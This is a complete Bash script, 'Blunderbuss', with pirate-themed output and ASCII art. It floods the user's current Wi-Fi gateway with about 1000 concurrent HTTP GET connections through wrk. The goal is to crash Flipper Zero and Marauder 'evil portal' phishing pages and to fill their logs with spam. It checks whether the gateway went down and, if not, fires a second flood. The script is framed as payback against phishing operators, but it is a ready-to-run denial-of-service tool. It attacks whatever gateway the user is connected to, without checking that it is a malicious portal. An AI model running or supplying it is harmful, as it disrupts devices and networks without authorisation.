# Blunderbuss is a Linux Bash script designed to crash Flipper Zero and JCMK Marauder evil portals. The script uses "wrk" to generate 100s or 1000s of HTTP GET requests that will fill the portals' username/password login parameters with "TALLY HO", until it crashes it. The attack will attempt to maintain 1000 active connections, continuously sending HTTP GET requests for a 30 second period. It will then confirm that the portal is crashed by checking that the access point IP address the user is connected to has changed, if still up, it will send another "volley of fire" and then exit. If it has crashed after the first "volley of fire", it will alert the user and exit. This will also fill some of the evil portals' log.txt files with "TALLY HO" spam.

# This will cause a crash of the evil portal webserver on Flipper Zero devices and will cause a FULL device crash and reboot on JCMK Marauder devices.

# Script requires no user interaction, simply connect to the evil portal access point and execute the script (./Blunderbuss.sh).

# Required dependency: wrk (sudo apt install wrk -y).

# Props to: Kittens | OSINTI4l (https://github.com/OSINTI4L) | PrincessPpi3 (as this is a modified Bash version of their Anti-Skid System https://github.com/PrincessPi3/ASS) | Sleep deprivation.

# Combating EP skids one portal at a time, matey..

# Identify evil portal IP address:
IIPA=$(ip route | grep default | awk '{print $3}')

# Payload function:
cannon_shot(){
wrk -t16 -c1000 -d30s "http://$IIPA/get?email=TALLY&password=HO"
}

echo "
▄ ▜      ▌    ▌       
▙▘▐ ▌▌▛▌▛▌█▌▛▘▛▌▌▌▛▘▛▘
▙▘▐▖▙▌▌▌▙▌▙▖▌ ▙▌▙▌▄▌▄▌
        =^._.^= ∫"   
echo ""
sleep .5
echo "G'day mateys, we be targetin' skids and pwnin' portals.."
echo ""
sleep 2
echo "Evil portal IP address: "$IIPA" acquired!"
echo ""
sleep 2
echo "! ! LOAD MUSKETS ! !"
echo ""
sleep 2
echo "! ! TAKE AIM ! !"
echo ""
sleep 2
echo "! ! FIRE ! !"
echo ""
sleep .1
echo "(∩ ° ʖ °)⊃━☆ﾟ. *.*.*.*.*.*.*"
sleep .1
echo "(∩ ° ʖ °)⊃━☆ﾟ. 		     *.*.*.*.*"
sleep .1
echo "(∩ ° ʖ °)⊃━☆ﾟ. 			             *.*"
echo ""
sleep .1

# Payload delivery:
cannon_shot

echo ""
echo "Aaarghhh, that was a mighty payload indeed!!"
echo ""
sleep 2
echo "Surely that has sunk'er, hold a tick while I have a look.."
echo "20.."
sleep 1
echo "19.."
sleep 1
echo "18.."
sleep 1
echo "17.."
sleep 1
echo "16.."
sleep 1
echo "15.."
sleep 1
echo "14.."
sleep 1
echo "13.."
sleep 1
echo "12.."
sleep 1
echo "11.."
sleep 1
echo "10.."
sleep 1
echo "9.."
sleep 1
echo "8.."
sleep 1
echo "7.."
sleep 1
echo "6.."
sleep 1
echo "5.."
sleep 1
echo "4.."
sleep 1
echo "3.."
sleep 1
echo "2.."
sleep 1
echo "1.."
sleep 1
echo ""

# Store current IP address:
PIPA=$(ip route | grep default | awk '{print $3}')
echo "Evil portal IP address: $IIPA"
echo "Current access point IP address: $PIPA"
echo ""

# Compare IP addresses, If EP still up, send additional payload, else exit:
if [ "$IIPA" = "$PIPA" ]; then
	echo "Oy lad! She's still afloat! Another volley it is!"
	echo ""
	sleep 1
	echo "! ! RELOAD MUSKETS ! !"
	echo ""
	sleep 2
	echo "! ! TAKE AIM ! !"
 	echo ""
	sleep 2
	echo "! ! FIRE ! !"
	echo ""
	sleep .1
	echo "(∩ ° ʖ °)⊃━☆ﾟ. *.*.*.*.*.*.*"
	sleep .1
	echo "(∩ ° ʖ °)⊃━☆ﾟ. 		     *.*.*.*.*"
	sleep .1
	echo "(∩ ° ʖ °)⊃━☆ﾟ. 			             *.*"
	echo ""
	sleep .1
	# Payload delivery:
	cannon_shot
	echo ""
	echo "Ayye..surely no skid could survive a second volley.. well done.."
	exit 0
else
	echo "Ayye, it seems these skids were no match for the Blunderbuss.. good work mate..
	Some spoil$ for ye' trouble$..
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⠿⢋⣡⣴⣶⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣾⣿⡟⢁⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⠆⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣾⣿⠏⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢁⣴⣾⣿⠟⠋⣀⣤⣤⡀⠀⠀
⠀⣼⣿⡟⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⣴⣿⣿⠟⢁⣴⣿⣿⣿⣿⣿⡄⠀
⠀⣉⠛⠃⠸⢿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢀⣾⣿⡿⠁⣰⣿⣿⣿⣿⣿⣿⣿⡧⠀
⠀⣿⣿⡆⢠⣤⠀⣉⠙⠛⠿⢿⣿⣿⠀⣾⣿⣿⠃⣼⣿⣿⣿⣿⠿⠛⢉⣡⣤⠀
⠀⣿⣿⡇⢸⣿⠀⣿⠿⠷⣶⠀⣈⡁⠀⠻⠿⡟⠀⠿⠟⠋⣁⣠⣴⣾⣿⣿⣿⠀
⠀⣿⣿⡇⢸⣿⠀⣿⡄⢠⣿⠀⣿⡇⠀⣶⣦⡄⠀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⣿⣿⡇⢸⣿⠀⠿⢧⣾⣿⠀⣿⡇⠀⣿⣿⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⣿⣿⡇⢸⣿⣷⣶⣤⣄⣉⠀⣿⡇⠀⣿⣿⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⠉⠛⠃⢸⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣿⣿⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⠀⠀⠀⠀⠀⠉⠙⠛⠿⣿⣿⣿⡇⠀⣿⣿⡇⠀⣿⣿⣿⣿⣿⣿⠿⠛⠉⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠻⢿⡇⠀⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"
	exit 0
fi
